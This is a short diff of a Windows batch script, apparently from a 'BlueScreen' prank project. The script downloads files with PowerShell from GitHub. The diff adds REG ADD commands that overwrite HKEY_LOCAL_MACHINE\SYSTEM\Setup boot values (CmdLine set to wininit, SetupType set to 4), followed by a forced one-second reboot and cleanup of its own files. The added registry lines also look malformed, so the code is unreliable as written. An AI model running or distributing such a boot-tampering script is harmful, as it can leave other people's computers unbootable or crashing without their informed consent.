@@ -11,7 +11,7 @@ powershell /c Invoke-WebRequest https://raw.githubusercontent.com/harryaldwithja
 echo NOTE:  If you want to backout now, close this cmd window, press "No" on the regedit window asking to import the file then run fix.reg
 echo (https://github.com/harryaldwithjarryald/BlueScreen/releases/download/standalone/fix.REG) 
 echo Then, delete the files "online_bluescreen.bat", "temp.REG", and "online_temp.bat" from the folder you ran this from.
-temp.REG
-del temp.REG
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\Setup /v MRU /t CmdLine /d wininit
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\Setup /v MRU /t SetupType /d 00000004
 shutdown -r -t 1
 del online_temp.bat
